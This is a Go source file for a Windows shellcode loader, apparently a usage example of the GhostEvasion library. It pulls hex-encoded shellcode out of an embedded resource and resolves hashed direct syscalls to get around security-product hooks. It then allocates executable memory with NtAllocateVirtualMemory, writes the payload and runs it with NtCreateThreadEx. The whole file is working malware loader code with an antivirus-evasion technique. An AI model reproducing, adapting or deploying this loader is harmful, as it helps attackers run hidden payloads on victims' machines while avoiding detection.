package main

import (
	"crypto/sha1"
	"encoding/hex"
	"strings"
	"unsafe"

	ghostevasion "github.com/BlackShell256/GhostEvasion/pkg/GhostEvasion"
	"golang.org/x/sys/windows"
)

var (
	kernel32      = ghostevasion.NewLazyDLL("kernel32")
	FindResourceW = kernel32.NewProc("FindResourceW")
	LoadResourceF = kernel32.NewProc("LoadResource")
)

func MAKEINTRESOURCE(id uintptr) *uint16 {
	return (*uint16)(unsafe.Pointer(id))
}

func LoadResource(Module, ResInfo uintptr) uintptr {
	ret, err := LoadResourceF.Call(
		Module,
		ResInfo,
	)
	if err != nil {
		panic(err)
	}

	return ret
}

func FindResource(Module uintptr, Name, Type *uint16) uintptr {
	ret, err := FindResourceW.Call(
		Module,
		uintptr(unsafe.Pointer(Name)),
		uintptr(unsafe.Pointer(Type)))
	if err != nil {
		panic(err)
	}

	return ret
}

func ReturnShellcode() []byte {
	Resource := FindResource(0, MAKEINTRESOURCE(1), MAKEINTRESOURCE(24))
	DataResource := LoadResource(0, Resource)
	str := windows.BytePtrToString((*byte)(unsafe.Pointer(DataResource)))
	init := strings.Index(str, "#!")
	final := strings.Index(str, "$!")

	strFinal := str[init+2 : final]
	shellcode, err := hex.DecodeString(strFinal)
	if err != nil {
		panic(err)
	}

	return shellcode
}

func hash(f string) string {
	s := []byte(f)
	key := []byte{0xde, 0xad, 0xbe, 0xef}
	for i := 0; i < len(s); i++ {
		s[i] ^= key[i%len(key)]
	}
	sha := sha1.New()
	sha.Write(s)
	return hex.EncodeToString(sha.Sum(nil))[:16]
}

const (
	INFINITE               = 0xffffffff
	Handle                 = 0xffffffffffffffff
	MEM_COMMIT             = 0x00001000
	MEM_RESERVE            = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40
	GENERIC_EXECUTE        = 0x20000000
)

func main() {
	shellcode := ReturnShellcode()
	newWhisper := ghostevasion.Whisper(hash)

	NtAllocateVirtualMemory, err := newWhisper.GetSysid("1021ddc2cb8b096b")
	if err != nil {
		panic(err)
	}

	var BaseAddress uintptr
	RegionSize := uintptr(len(shellcode))

	err = NtAllocateVirtualMemory.Syscall(
		Handle,
		uintptr(unsafe.Pointer(&BaseAddress)),
		0,
		uintptr(unsafe.Pointer(&RegionSize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		panic(err)
	}

	NtWriteVirtualMemory, err := newWhisper.GetSysid("619eb9ad13d2bbd1")
	if err != nil {
		panic(err)
	}

	err = NtWriteVirtualMemory.Syscall(
		Handle,
		BaseAddress,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	if err != nil {
		panic(err)
	}

	var Thread uintptr
	NtCreateThreadEx, err := newWhisper.GetSysid("2b72e62dd995115a")
	if err != nil {
		panic(err)
	}

	err = NtCreateThreadEx.Syscall(
		uintptr(unsafe.Pointer(&Thread)),
		GENERIC_EXECUTE,
		0,
		Handle,
		BaseAddress,
		0,
		0,
		0,
		0,
		0,
		0,
	)

	if err != nil {
		panic(err)
	}

	Time := -(INFINITE)
	NtWaitForSingleObject, err := newWhisper.GetSysid("5107adda1d10ef6e")
	if err != nil {
		panic(err)
	}

	err = NtWaitForSingleObject.Syscall(
		Thread,
		0,
		uintptr(unsafe.Pointer(&Time)),
	)
	if err != nil {
		panic(err)
	}

}
